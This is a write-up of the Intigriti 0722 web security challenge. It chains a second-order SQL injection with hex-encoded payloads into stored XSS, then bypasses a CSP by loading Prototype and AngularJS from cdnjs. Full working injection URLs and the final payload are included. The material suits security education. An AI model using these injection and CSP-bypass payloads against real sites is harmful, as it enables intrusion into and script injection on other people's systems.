---
layout: single
title: Intigriti 0722 - XSS Challenge Write-up
date: 2020-7-30
classes: wide
published: false
tags:
    - Intigriti
    - Writeup
    - XSS
    - SQLi
---

### Introduction

The challenge is available at [https://challenge-0722.intigriti.io/](https://challenge-0722.intigriti.io/)

The rules for the challenge are as follow :
![](/assets/images/intigriti_challenges/0722_rules.png)

And the challenge page itself is available at [https://challenge-0722.intigriti.io/challenge/challenge.php](https://challenge-0722.intigriti.io/challenge/challenge.php)

### Recon & Exploitation

Looking at the challenge page, it's a simple Php blog page using no Javascript script with a unique GET parameter **month** used when filtering posts by month of publication.

Playing with this parameter by using random values, we can see that the site return an error :
![](/assets/images/intigriti_challenges/0722_error.png)


From there we can try to see if **month** is vulnerable to SQLi, 
first of all it should be noted that there are two month with published posts : February and March which correspond respectively to the values 2 and 3 of the parameter month.

So if the **month** parameter is vulnerable using the value ```3-1``` should return the posts correponding to February(2) :

![](/assets/images/intigriti_challenges/0722_sqlidetect.png)

It works, so it's time to see what we can do with this SQLi.

First, we need to find the number of columns returned by the sql request. 

Using **order by X--** with 'X' an incremental number, we find that with the value 5 the site doesn't raise an error: 

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=2 order by 5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=2%20order%20by%205--)

Then we can identify which values are reflected on the page using **union select** : 

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,4,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,4,5--)

Here we can see that the fields 2, 3 and 5 are displayed, that they corresponding respectively to the post title, message and date, and that the post's author is empty.

At this point, I was thinking to inject js script directly in one of the displayed fields, so trying to inject some random string first :

![](/assets/images/intigriti_challenges/0722_filter.png)

It appeared that the characters **'** and **"** are filtered, so we can use an hexadecimal encoding to bypass this filter (more infos [here](https://portswigger.net/support/sql-injection-bypassing-common-filters)): 

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,0x74657374,3,4,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,0x74657374,3,4,5--)

After some try to inject js code in the three reflected fields it appeared that none of them was vulnerable to an XSS, so we need to find a way to control the post's author name field.

Using values 1 or 2 for the fourth field in our **union select** query, we can see that the author's names 'Anton' and 'Jake' are displayed, any other numeric value result in an empty field for the author's name, a little like for the "month" parameter...

![](/assets/images/intigriti_challenges/0722_authortest.png)

From this we can deduce that maybe the SQL request return the id of the post's author then use it in another SQL request to return the author's name.

So to test this asumption we can test the field corresponding to the author like we did for the **month** parameter, using '2-1' or '3-1' : 

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,3-1,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,3-1,5--)

The page display "Jake" as the author of the post so our assumption was correct and we can look further.

Like previously we will test for the number of returned fields by the second SQL, but using **order by** will not work because if the second SQL request return an error we will not see it on the webpage, only an empty post's author name will be displayed.

So we need to use **union select** and increment the number of returned fields at every request until we see a data returned in the post's author name on the page.

Very important : We must not forget to encode the payload everytime.

After some try, we see the payload **"0 union select 1,2,3--"** (encoded as 0x3020756e696f6e2073656c65637420312c322c332d2d) returning 2 as post's author name:

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,0x3020756e696f6e2073656c65637420312c322c332d2d,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,0x3020756e696f6e2073656c65637420312c322c332d2d,5--)

Now we can try to inject a custom value as author's name using payload **"0 union select 1,"test",3--"** but it return an empty value as author's name 

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,0x3020756e696f6e2073656c65637420312c2274657374222c332d2d,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,0x3020756e696f6e2073656c65637420312c2274657374222c332d2d,5--)

It seems that the author's id value returned by the first SQL request is also filtered, so we need to encode it too.

- For example to display **test**, we encode it : **0x74657374**
- Then we use this encoded value in the payload as author's name for the second SQL request and we encode it : 
	- **0 union select 1,0x74657374,3--** become **0x3020756e696f6e2073656c65637420312c307837343635373337342c332d2d**
- Finally we use this encoded payload in the payload for the first SQL request : 
	- **0 union select 1,2,3,0x3020756e696f6e2073656c65637420312c307837343635373337342c332d2d,5--**

And it works :

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,0x3020756e696f6e2073656c65637420312c307837343635373337342c332d2d,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,0x3020756e696f6e2073656c65637420312c307837343635373337342c332d2d,5--)

Now we can inject some javascript code : 
```js
<script>alert(document.domain)</script>
```

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,0x3020756e696f6e2073656c65637420312c30783363373336333732363937303734336536313663363537323734323836343666363337353664363536653734326536343666366436313639366532393363326637333633373236393730373433652c332d2d,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,0x3020756e696f6e2073656c65637420312c30783363373336333732363937303734336536313663363537323734323836343666363337353664363536653734326536343666366436313639366532393363326637333633373236393730373433652c332d2d,5--)

But nothing happen... looking at the console, we can see this error message :
```
Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com". Either the 'unsafe-inline' keyword, a hash ('sha256-X6WoVv8sUlFXk0r+MI/R+p2PsbD1k74Z+jLIpYAjIgE='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback
```

That means that CSP rules prevents the code execution, so we need to find a way to bypass them.

Luckily for us there is a lot of ressoucres available to bypass the ***.cloudflare.com** directive as described here: 

[https://blog.0daylabs.com/2016/09/09/bypassing-csp/](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)

So finally we can use this payload :
```html
{% raw %}<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}</div>{% endraw %}
```

And after encoding of the different parts we obtain this solution :

[https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 union select 1,2,3,0x3020756e696f6e2073656c65637420312c3078336337333633373236393730373432303733373236333364323236383734373437303733336132663266363336343665366137333265363336633666373536343636366336313732363532653633366636643266363136613631373832663663363936323733326637303732366637343666373437393730363532663331326533373265333232663730373236663734366637343739373036353265366137333232336533633266373336333732363937303734336533633733363337323639373037343230373337323633336432323638373437343730373333613266326636333634366536613733326536333663366637353634363636633631373236353265363336663664326636313661363137383266366336393632373332663631366536373735366336313732326536613733326633313265333032653331326636313665363737353663363137323265366137333232336533633266373336333732363937303734336533633634363937363230366536373264363137303730323036653637326436333733373033653762376232343666366532653633373537323732373932653633363136633663323832393265363136633635373237343238323436663665326536333735373237323739326536333631366336633238323932653634366636333735366436353665373432653634366636643631363936653239376437643363326636343639373633652c332d2d,5--](https://challenge-0722.intigriti.io/challenge/challenge.php?month=0%20union%20select%201,2,3,0x3020756e696f6e2073656c65637420312c3078336337333633373236393730373432303733373236333364323236383734373437303733336132663266363336343665366137333265363336633666373536343636366336313732363532653633366636643266363136613631373832663663363936323733326637303732366637343666373437393730363532663331326533373265333232663730373236663734366637343739373036353265366137333232336533633266373336333732363937303734336533633733363337323639373037343230373337323633336432323638373437343730373333613266326636333634366536613733326536333663366637353634363636633631373236353265363336663664326636313661363137383266366336393632373332663631366536373735366336313732326536613733326633313265333032653331326636313665363737353663363137323265366137333232336533633266373336333732363937303734336533633634363937363230366536373264363137303730323036653637326436333733373033653762376232343666366532653633373537323732373932653633363136633663323832393265363136633635373237343238323436663665326536333735373237323739326536333631366336633238323932653634366636333735366436353665373432653634366636643631363936653239376437643363326636343639373633652c332d2d,5--)

Thanks a lot for taking the time to read this writeup! :)